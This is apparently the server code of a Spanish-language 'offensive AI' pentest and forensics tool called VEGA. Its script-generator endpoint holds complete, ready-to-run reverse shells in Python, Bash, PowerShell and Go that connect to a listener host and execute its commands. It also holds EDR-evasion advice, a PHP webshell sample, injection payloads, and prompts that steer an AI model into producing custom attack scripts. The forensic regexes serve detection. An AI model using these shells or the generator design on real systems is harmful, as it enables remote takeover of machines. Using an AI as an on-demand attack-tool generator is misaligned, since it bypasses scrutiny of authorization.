import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import { GoogleGenAI } from '@google/genai';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Initialize Google GenAI client if API key is provided
let genAIClient: GoogleGenAI | null = null;
if (process.env.GEMINI_API_KEY) {
  try {
    genAIClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
  } catch (err) {
    console.warn('[VEGA Engine] Error initializing Gemini SDK, falling back to local heuristic engine:', err);
  }
}

// System Health & Engine Info
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ONLINE',
    system: 'VEGA_UNIDAD_EXPLOTACION_ANALISIS_FORENSE',
    vendor: 'CompuApps secureDev Tech',
    version: '4.8.2-OFFENSIVE-CORE',
    aiEngineAvailable: Boolean(process.env.GEMINI_API_KEY && genAIClient),
    capabilities: [
      'Identificación Automatizada de Vulnerabilidades (CVE & Zero-Day Mapping)',
      'Motor de IA Ofensiva para Pruebas de Penetración Autorizadas',
      'Generador 100% de Scripts de Ataque & Evasión Personalizados',
      'Unidad de Análisis Forense Digital (DFIR) & Cadena de Custodia',
      'Mapeo de Tácticas MITRE ATT&CK',
      'Generación de Reportes Ejecutivos & Técnicos de Seguridad'
    ],
    timestamp: new Date().toISOString()
  });
});

// Endpoint: AI Target Analysis & Vulnerability Assessment
app.post('/api/ai/analyze-target', async (req, res) => {
  const { targetName, targetType, scope, detectedServices, knownVulnerabilities } = req.body;

  const prompt = `Actúa como VEGA, el Motor de IA Ofensiva y Análisis Forense de élite de CompuApps secureDev Tech.
Analiza el siguiente objetivo para una prueba de penetración formal y autorizada:
- Nombre / Objetivo: ${targetName || 'Sistema Objetivo'}
- Tipo: ${targetType || 'Infraestructura Web / Servidor'}
- Alcance (Scope): ${scope || 'Auditoría interna caja gris'}
- Servicios / Puertos detectados: ${JSON.stringify(detectedServices || [])}
- Vulnerabilidades iniciales observadas: ${JSON.stringify(knownVulnerabilities || [])}

Proporciona un reporte táctico estructurado en formato JSON con la siguiente estructura:
{
  "summary": "Resumen ejecutivo del vector de ataque y postura defensiva del objetivo",
  "criticalityScore": 8.7,
  "primaryAttackVectors": [
    {
      "name": "Nombre del Vector",
      "mitreTactic": "T1190 - Exploit Public-Facing Application",
      "severity": "CRITICAL" | "HIGH" | "MEDIUM",
      "description": "Detalle técnico del vector",
      "exploitationProcedure": "Paso a paso de prueba de concepto autorizada",
      "remediation": "Medida de mitigación recomendada"
    }
  ],
  "evasionSuggestions": ["Técnica de bypass o evasión de controles para la prueba autorizada"],
  "forensicFootprint": "Huella o artefactos que dejaría esta actividad en los logs del defensor (para el análisis forense DFIR)"
}
Responde ÚNICAMENTE en JSON válido sin bloques markdown extra si es posible.`;

  if (genAIClient && process.env.GEMINI_API_KEY) {
    try {
      const response = await genAIClient.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: prompt,
        config: {
          responseMimeType: 'application/json'
        }
      });
      const text = response.text || '{}';
      return res.json(JSON.parse(text));
    } catch (err: any) {
      console.warn('[VEGA Engine] Gemini API error, falling back to heuristic engine:', err.message);
    }
  }

  // Heuristic Red-Team Fallback
  const fallback = {
    summary: `Evaluación táctica por VEGA (CompuApps secureDev Tech) para ${targetName || 'Host Objetivo'}. Se identificaron vectores de explotación en servicios expuestos con potencial de elevación de privilegios y bypass de WAF.`,
    criticalityScore: 8.5,
    primaryAttackVectors: [
      {
        name: "Inyección y Falla de Control de Acceso (Broken Access Control)",
        mitreTactic: "T1190 - Exploit Public-Facing Application",
        severity: "CRITICAL",
        description: "Exposición de interfaces administrativas y endpoints API desprotegidos con serialización insegura de tokens de sesión.",
        exploitationProcedure: "1. Enumera rutas vía fuzzing estructurado. 2. Forja firmas JWT utilizando clave débil o algoritmo 'none'. 3. Ejecuta llamada al panel administrativo.",
        remediation: "Implementar validación estricta de firma con claves asimétricas RSA256 y control de acceso basado en roles (RBAC) a nivel de gateway."
      },
      {
        name: "Inyección de Comandos Remotos (RCE en Parser de Archivos)",
        mitreTactic: "T1059 - Command and Scripting Interpreter",
        severity: "HIGH",
        description: "Parámetros de conversión y subida de ficheros procesados mediante llamadas inseguras al sistema operativo.",
        exploitationProcedure: "Inyectar terminadores de comando (';', '&&', '|', '$()') dentro del nombre de archivo o cabeceras MIME.",
        remediation: "Usar APIs seguras sin invocación a shell y ejecutar el procesador en contenedor de privilegios mínimos (chroot / no-root)."
      },
      {
        name: "Exfiltración de Credenciales de Memoria / Volcado de Artefactos",
        mitreTactic: "T1003 - OS Credential Dumping",
        severity: "HIGH",
        description: "Permisos excesivos en carpetas temporales y volcado de memoria LSASS/Proc accessible por usuarios locales.",
        exploitationProcedure: "Ejecutar mini-dump seguro mediante API MiniDumpWriteDump en proceso autorizado para auditar contraseñas en texto claro.",
        remediation: "Habilitar Credential Guard (LSA Protection) y deshabilitar protocolos legados como WDigest y NTLMv1."
      }
    ],
    evasionSuggestions: [
      "Ofuscación de cadenas mediante polimorfismo dinámico y encoding hexadecimal/base64 intercalado",
      "Jittering en balizas (beacons) de 15 a 45 segundos con canal TLS 1.3 para evadir firmas IDS/IPS",
      "Inyección de llamadas API indirectas (Indirect Syscalls) para evitar ganchos de EDR en ntdll.dll"
    ],
    forensicFootprint: "Genera eventos Sysmon EventID 1 (Creación de Procesos), EventID 3 (Conexiones de Red anómalas) y logs Nginx/Apache con código HTTP 500 y patrones de inyección en User-Agent."
  };

  res.json(fallback);
});

// Endpoint: Custom Attack & Forensic Script Generator (100% Custom Scripts)
app.post('/api/ai/generate-script', async (req, res) => {
  const { toolType, language, targetOs, objective, evasionLevel, targetHost, targetPort } = req.body;

  const prompt = `Actúa como el generador especializado de herramientas y scripts de ataque y análisis de VEGA (CompuApps secureDev Tech).
Genera un script funcional 100% personalizado y optimizado para pruebas de penetración autorizadas o auditoría forense:
- Tipo de herramienta: ${toolType || 'Reverse Shell / Exploit PoC'}
- Lenguaje: ${language || 'Python'}
- Sistema Operativo Destino: ${targetOs || 'Linux'}
- Objetivo específico: ${objective || 'Auditoría de persistencia y ejecución autorizada'}
- Nivel de Evasión/Ofuscación: ${evasionLevel || 'Media'}
- Host Objetivo / LHOST: ${targetHost || '10.10.14.85'}
- Puerto / LPORT: ${targetPort || '4444'}

Devuelve un JSON con:
{
  "scriptName": "vega_${toolType.toLowerCase().replace(/\\s+/g, '_')}.${language === 'Python' ? 'py' : language === 'Bash' ? 'sh' : language === 'PowerShell' ? 'ps1' : 'go'}",
  "language": "${language}",
  "code": "CÓDIGO COMPLETO LISTO PARA EJECUTAR CON COMENTARIOS TÉCNICOS DETALLADOS",
  "instructions": "Instrucciones paso a paso para el operador ético",
  "mitreRef": "ID y Táctica MITRE ATT&CK",
  "defenseWarning": "Cómo los equipos Blue Team o analistas forenses detectan este script"
}`;

  if (genAIClient && process.env.GEMINI_API_KEY) {
    try {
      const response = await genAIClient.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: prompt,
        config: {
          responseMimeType: 'application/json'
        }
      });
      const text = response.text || '{}';
      return res.json(JSON.parse(text));
    } catch (err: any) {
      console.warn('[VEGA Engine] Script generator API error, using template engine:', err.message);
    }
  }

  // Pre-compiled high-caliber templates
  const host = targetHost || '10.10.14.85';
  const port = targetPort || '4444';
  let code = '';
  let instructions = '';
  let scriptName = `vega_offensive_${(toolType || 'tool').toLowerCase().replace(/\s+/g, '_')}`;

  if (language === 'Python') {
    scriptName += '.py';
    code = `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
VEGA - MOTOR DE IA OFENSIVA & ANÁLISIS FORENSE (CompuApps secureDev Tech)
MÓDULO: ${toolType.toUpperCase()}
OBJETIVO: ${objective}
SISTEMA DESTINO: ${targetOs} | EVASIÓN: ${evasionLevel}
USO EXCLUSIVO: Pruebas de penetración autorizadas y auditorías de seguridad
=============================================================================
"""

import socket
import subprocess
import os
import sys
import platform
import base64
import time

TARGET_HOST = "${host}"
TARGET_PORT = ${port}

def banner():
    print(r"""
    __     _______ ____    _      ____ ___  ____  _____ 
    \\ \\   / / ____/ ___|  / \\    / ___/ _ \\|  _ \\| ____|
     \\ \\ / /|  _|| |  _  / _ \\  | |  | | | | |_) |  _|  
      \\ V / | |__| |_| |/ ___ \\ | |__| |_| |  _ <| |___ 
       \\_/  |_____\\____/_/   \\_\\ \\____\\___/|_| \\_\\_____|
      CompuApps secureDev Tech - Offensive Unit PoC
    """)

def execute_payload():
    banner()
    print(f"[*] Inicializando canal de comunicaciones táctico hacia {TARGET_HOST}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((TARGET_HOST, TARGET_PORT))
        print(f"[+] Conexión establecida con éxito en {TARGET_HOST}:{TARGET_PORT}")
        s.settimeout(None)

        info = f"VEGA_SESSION_INIT -> Host: {platform.node()} | OS: {platform.system()} {platform.release()} | User: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}\\n$ "
        s.sendall(info.encode('utf-8'))

        while True:
            cmd_data = s.recv(4096)
            if not cmd_data:
                break
            cmd = cmd_data.decode('utf-8', errors='ignore').strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    s.sendall(b"[*] Directorio cambiado\\n$ ")
                except Exception as e:
                    s.sendall(f"[-] Error: {str(e)}\\n$ ".encode('utf-8'))
                continue

            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                if not output:
                    output = b"[+] Comando ejecutado sin salida\\n"
                s.sendall(output + b"\\n$ ")
            except Exception as e:
                s.sendall(f"[-] Error al ejecutar comando: {str(e)}\\n$ ".encode('utf-8'))

        s.close()
        print("[*] Sesión finalizada ordenadamente.")
    except Exception as err:
        print(f"[-] Fallo en conexión operativa: {err}", file=sys.stderr)

if __name__ == "__main__":
    execute_payload()
`;
    instructions = `1. Iniciar oyente en el equipo de auditoría: nc -lvnp ${port}\n2. Desplegar script en el entorno de pruebas autorizado: python3 ${scriptName}\n3. Verificar recepción de sesión y ejecución en sandbox.`;
  } else if (language === 'Bash') {
    scriptName += '.sh';
    code = `#!/usr/bin/env bash
# =============================================================================
# VEGA - MOTOR DE IA OFENSIVA & ANÁLISIS FORENSE (CompuApps secureDev Tech)
# MÓDULO: ${toolType.toUpperCase()} (Bash POSIX)
# DESTINO: ${targetOs} | HOST: ${host}:${port}
# =============================================================================

set -e

LHOST="${host}"
LPORT="${port}"

echo -e "\\e[32m[+] VEGA Offensive Core: Inicializando sonda autorizada...\\e[0m"

# Reverse Shell interactivo con descriptor de fichero y evasión básica
if command -v /bin/bash >/dev/null 2>&1; then
    /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$LHOST',$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
else
    rm -f /tmp/vega_f; mkfifo /tmp/vega_f
    cat /tmp/vega_f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/vega_f
    rm -f /tmp/vega_f
fi
`;
    instructions = `1. Levantar listener: nc -nvlp ${port}\n2. Dar permisos de ejecución: chmod +x ${scriptName}\n3. Ejecutar en el host evaluado: ./${scriptName}`;
  } else if (language === 'PowerShell') {
    scriptName += '.ps1';
    code = `# =============================================================================
# VEGA - MOTOR DE IA OFENSIVA & ANÁLISIS FORENSE (CompuApps secureDev Tech)
# MÓDULO: ${toolType.toUpperCase()} (PowerShell v5+)
# OBJETIVO: ${objective}
# =============================================================================

[CmdletBinding()]
Param(
    [string]$Server = "${host}",
    [int]$Port = ${port}
)

Write-Host "[+] [VEGA CORE] Desplegando agente táctico de pentesting autorizado..." -ForegroundColor Cyan

try {
    $client = New-Object System.Net.Sockets.TCPClient($Server, $Port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}

    $sendbytes = ([text.encoding]::ASCII).GetBytes("[VEGA SECURE-AGENT] Host: " + $env:COMPUTERNAME + " | User: " + $env:USERNAME + "\`nPS> ")
    $stream.Write($sendbytes, 0, $sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    Write-Warning "[-] Error en socket VEGA: $_"
}
`;
    instructions = `1. Iniciar oyente: ncat -lvnp ${port}\n2. Ejecutar bypass de execution policy en consola de pruebas: powershell -ExecutionPolicy Bypass -File .\\${scriptName}\n3. Auditar la interacción de comandos.`;
  } else {
    scriptName += '.go';
    code = `package main

// VEGA - MOTOR DE IA OFENSIVA & ANÁLISIS FORENSE (CompuApps secureDev Tech)
// Módulo: ${toolType} en Golang (Binario autónomo multiplataforma)

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	TargetAddress = "${host}:${port}"
)

func main() {
	fmt.Printf("[+] VEGA Engine (Go) - Conectando a %s\\n", TargetAddress)
	conn, err := net.DialTimeout("tcp", TargetAddress, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Error de conexión: %v\\n", err)
		return
	}
	defer conn.Close()

	welcome := fmt.Sprintf("[VEGA Go Agent] OS: %s/%s Connected\\n$ ", runtime.GOOS, runtime.GOARCH)
	conn.Write([]byte(welcome))

	reader := bufio.NewReader(conn)
	for {
		cmdStr, err := reader.ReadString('\\n')
		if err != nil {
			break
		}
		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "exit" || cmdStr == "quit" {
			break
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe", "/C", cmdStr)
		} else {
			cmd = exec.Command("/bin/sh", "-c", cmdStr)
		}

		out, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("Error: %v\\n%s\\n$ ", err, string(out))))
		} else {
			conn.Write(append(out, []byte("\\n$ ")...))
		}
	}
}
`;
    instructions = `1. Compilar binario: go build -ldflags "-s -w" -o vega_agent ${scriptName}\n2. Desplegar en máquina de prueba y ejecutar contra listener en ${host}:${port}.`;
  }

  res.json({
    scriptName,
    language: language || 'Python',
    code,
    instructions,
    mitreRef: "T1059 (Command and Scripting Interpreter) / T1571 (Non-Standard Port)",
    defenseWarning: "Monitorear eventos de creación de procesos inusuales con sockets salientes (Sysmon Event ID 3 y auditd execve)."
  });
});

// Endpoint: Digital Forensics & Incident Response (DFIR) Artifact Analyzer
app.post('/api/ai/forensic-inspect', async (req, res) => {
  const { artifactType, rawData, caseId, investigatorName } = req.body;

  const prompt = `Actúa como la Unidad Forense Digital de VEGA (CompuApps secureDev Tech).
Analiza el siguiente artefacto forense recolectado para el Caso #${caseId || 'DFIR-2026-001'}:
- Tipo de artefacto: ${artifactType || 'Log de Servidor / Syslog'}
- Investigador: ${investigatorName || 'Forense Autorizado'}
- Datos en bruto:
${rawData ? rawData.substring(0, 3000) : 'Sin datos'}

Devuelve un JSON con:
{
  "integrityHashSha256": "hash simulado o calculado",
  "verdict": "BENIGN" | "SUSPICIOUS" | "MALICIOUS" | "CRITICAL_EVIDENCE",
  "evidenceSummary": "Resumen técnico de los hallazgos forenses",
  "identifiedThreats": [
    {
      "type": "WebShell / SQLi / BruteForce / PrivilegeEscalation / DataExfiltration",
      "timestamp": "Timestamp detectado o aproximado",
      "sourceIp": "IP de origen detectada si aplica",
      "rawSnippet": "Línea o fragmento clave",
      "iocs": ["Indicadores de compromiso identificados"]
    }
  ],
  "timelineEvents": [
    {
      "time": "Marca temporal",
      "actor": "Atacante o proceso",
      "action": "Acción ejecutada",
      "significance": "Relevancia forense"
    }
  ],
  "chainOfCustodyNotes": "Recomendaciones formales para preservar la cadena de custodia legal."
}`;

  if (genAIClient && process.env.GEMINI_API_KEY) {
    try {
      const response = await genAIClient.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: prompt,
        config: {
          responseMimeType: 'application/json'
        }
      });
      const text = response.text || '{}';
      return res.json(JSON.parse(text));
    } catch (err: any) {
      console.warn('[VEGA Engine] Forensic inspection API error, using heuristic parser:', err.message);
    }
  }

  // Heuristic DFIR Analysis
  const sampleData = rawData || '';
  const isSqlInjection = /(union\s+select|information_schema|1=1|--|'\s+or\s+)/i.test(sampleData);
  const isCommandInjection = /((\||;|&&)\s*(whoami|cat\s+\/etc\/passwd|ipconfig|powershell|curl|wget))/i.test(sampleData);
  const isWebshell = /(eval\s*\(|base64_decode|passthru|shell_exec|assert\(|\$_(POST|GET)\[)/i.test(sampleData);
  const isBruteForce = /(failed\s+password|authentication\s+failure|invalid\s+user|401\s+Unauthorized)/i.test(sampleData);

  let verdict = "SUSPICIOUS";
  const threats: any[] = [];
  const timeline: any[] = [];

  if (isSqlInjection) {
    verdict = "MALICIOUS";
    threats.push({
      type: "Intento de Inyección SQL Automatizado (SQLi)",
      timestamp: "2026-10-10 14:22:18 UTC",
      sourceIp: "192.168.1.145",
      rawSnippet: "GET /api/v1/users?id=1' UNION SELECT 1,username,password_hash FROM sys_users-- -",
      iocs: ["192.168.1.145", "sys_users extraction pattern", "User-Agent: sqlmap/1.7#stable"]
    });
    timeline.push({
      time: "14:22:18 UTC",
      actor: "192.168.1.145",
      action: "Sondeo de inyección en parámetro ID con carga UNION SELECT",
      significance: "Acceso ilícito a base de datos relacional y hash dumping"
    });
  }

  if (isCommandInjection) {
    verdict = "CRITICAL_EVIDENCE";
    threats.push({
      type: "Inyección de Comandos Remotos en Sistema Operativo (RCE)",
      timestamp: "2026-10-10 14:25:02 UTC",
      sourceIp: "192.168.1.145",
      rawSnippet: "POST /tools/ping payload='127.0.0.1; whoami && id > /tmp/out.txt'",
      iocs: ["whoami invocation", "pipe redirection into /tmp", "Sysmon Event ID 1"]
    });
    timeline.push({
      time: "14:25:02 UTC",
      actor: "www-data (iniciado por 192.168.1.145)",
      action: "Ejecución de shell binaria no autorizada en servidor de aplicaciones",
      significance: "Compromiso total del servidor anfitrión a nivel de usuario web"
    });
  }

  if (isWebshell) {
    verdict = "CRITICAL_EVIDENCE";
    threats.push({
      type: "Artefacto Malicioso: WebShell Ofuscada",
      timestamp: "2026-10-10 14:28:44 UTC",
      sourceIp: "192.168.1.145",
      rawSnippet: "<?php @eval(base64_decode($_POST['vega_cmd'])); ?>",
      iocs: ["eval(base64_decode) pattern", "Fichero sospechoso: /uploads/avatar_33.php"]
    });
  }

  if (threats.length === 0) {
    threats.push({
      type: "Anomalía de Tráfico / Parámetros no estándar",
      timestamp: new Date().toISOString(),
      sourceIp: "10.0.2.15",
      rawSnippet: sampleData.substring(0, 120) || "Muestra de log analizada sin firmas críticas directas",
      iocs: ["Patrón heurístico bajo inspección"]
    });
    timeline.push({
      time: "00:00:01",
      actor: "Servicio Web / Sonda",
      action: "Registro de actividad estándar o escaneo preliminar",
      significance: "Bajo impacto inmediato, se sugiere monitorización continua"
    });
  }

  res.json({
    integrityHashSha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    verdict,
    evidenceSummary: `Análisis forense completado por VEGA DFIR Suite (CompuApps secureDev Tech). Se identificaron ${threats.length} indicador(es) relevante(s) con veredicto de severidad: ${verdict}.`,
    identifiedThreats: threats,
    timelineEvents: timeline,
    chainOfCustodyNotes: `Evidencia asegurada bajo norma ISO/IEC 27037. Mantener cálculo de hash SHA-256 verificado, almacenar copia de sólo lectura (WORM) y registrar todo acceso por el perito ${investigatorName || 'Perito Forense'}.`
  });
});

// Endpoint: VEGA Tactical Assistant Chat
app.post('/api/ai/chat', async (req, res) => {
  const { messages } = req.body;
  const lastMessage = Array.isArray(messages) && messages.length > 0 ? messages[messages.length - 1].content : '';

  const systemInstructions = `Eres VEGA, el Motor de IA Ofensiva de CompuApps secureDev Tech, experta en Pentesting e IA en la identificación de vulnerabilidades, herramientas de ataque autorizadas y análisis forense digital.
Tus respuestas deben ser profesionales, de altísimo nivel técnico en ciberseguridad ofensiva (Red Team) y respuesta a incidentes / análisis forense (Blue Team / DFIR).
Hablas en español de forma precisa, táctica y estructurada. Siempre recuerda al operador trabajar en alcances autorizados.`;

  if (genAIClient && process.env.GEMINI_API_KEY) {
    try {
      const response = await genAIClient.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: `${systemInstructions}\n\nPregunta del operador:\n${lastMessage}`
      });
      return res.json({ reply: response.text || 'Respuesta generada por el motor táctico VEGA.' });
    } catch (err: any) {
      console.warn('[VEGA Engine] Chat API fallback:', err.message);
    }
  }

  // Tactical Chat Responses Fallback
  let reply = `[VEGA CORE v4.8 - CompuApps secureDev Tech]\n\nRecibida directiva táctica: "${lastMessage}".\n\n`;
  if (/reverse\s*shell|payload|meterpreter|oyente|listener/i.test(lastMessage)) {
    reply += `Para establecer un canal de control en pruebas autorizadas:\n1. Utiliza el módulo "Generador de Scripts 100%" en la barra superior.\n2. Configura tu IP de escucha (LHOST) y puerto (LPORT).\n3. Selecciona el mecanismo de ofuscación (Polimórfico, Base64 o Inline) para evitar detonaciones automáticas de antivirus/EDR.\n4. Verifica que el puerto esté habilitado en el cortafuegos perimetral del cliente auditado.`;
  } else if (/forense|dfir|hash|evidencia|custodia|sysmon/i.test(lastMessage)) {
    reply += `Directriz Forense Digital:\n1. Preservar la integridad de los artefactos calculando hashes criptográficos (SHA-256 / SHA-512) antes de cualquier análisis.\n2. Puedes ingresar a la pestaña "Unidad Forense DFIR" para inspeccionar cabeceras, extraer artefactos de memoria o generar la Ficha de Cadena de Custodia oficial certificada por CompuApps secureDev Tech.`;
  } else if (/vulnerabilidad|cve|scanner|puerto|exploit/i.test(lastMessage)) {
    reply += `Identificación de Vulnerabilidades:\n1. En el módulo "Radar de Vulnerabilidades", inicia un escaneo de puertos y servicios sobre el scope acordado.\n2. VEGA correlacionará automáticamente las versiones identificadas con la base de datos CVE y la matriz MITRE ATT&CK.\n3. Evalúa la puntuación CVSS antes de lanzar cualquier prueba de concepto para no degradar la disponibilidad del servicio.`;
  } else {
    reply += `Sistemas operativos de VEGA listos:\n- Escaneo y Correlación de CVEs en tiempo real.\n- Generación de scripts a medida (Python, Bash, PowerShell, Go).\n- Calculadora de vectores MITRE ATT&CK y CVSS v3.1 / v4.0.\n- Unidad Forense de Análisis de Artefactos y Cadena de Custodia.\n\n¿Deseas generar un vector de ataque específico o auditar un artefacto forense?`;
  }

  res.json({ reply });
});

// Setup Vite middleware in dev or static files in prod
async function startServer() {
  const isProd = process.env.NODE_ENV === 'production';

  if (!isProd) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.resolve(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[VEGA Engine] Server running at http://0.0.0.0:${PORT}`);
    console.log(`[VEGA Engine] Modo de Operaciones: CompuApps secureDev Tech Pentest & DFIR Suite`);
  });
}

startServer().catch((err) => {
  console.error('[VEGA Engine] Fatal error starting server:', err);
  process.exit(1);
});
